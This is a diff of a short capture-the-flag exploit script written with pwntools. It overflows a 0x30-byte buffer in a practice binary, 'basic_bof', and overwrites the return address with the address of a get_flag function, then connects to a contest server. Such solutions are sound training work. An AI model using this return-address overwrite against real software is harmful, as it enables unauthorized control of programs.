@@ -1,22 +1,18 @@
 from pwn import *
-
 context.log_level = 'debug'
-# p = process("./basic_bof")
-p = remote("pwn.isangxcaution.xyz", 10010)
-e = ELF("./basic_bof")
 
+p = process("./basic_bof")
+p = remote("101.79.9.58", 10010)
 
-def slog(symbol, addr): return success(symbol + ": " + hex(addr))
+# gdb.attach(p)
+# pause()
 
+# exploit here
+get_flag_addr = 0x401296
 
-get_flag = e.symbols["get_flag"]
-slog("get_flag :", get_flag)
-
-p.recvuntil("Input :")
-
-payload = b"A"*0x30  # fill buf
-payload += b"B"*0x8  # fill buf
-payload += p64(get_flag)  # RET overwrite
+payload = b'A'*0x30
+payload += b'B'*0x8
+payload += p64(get_flag_addr)
 
 p.sendline(payload)
 p.interactive()
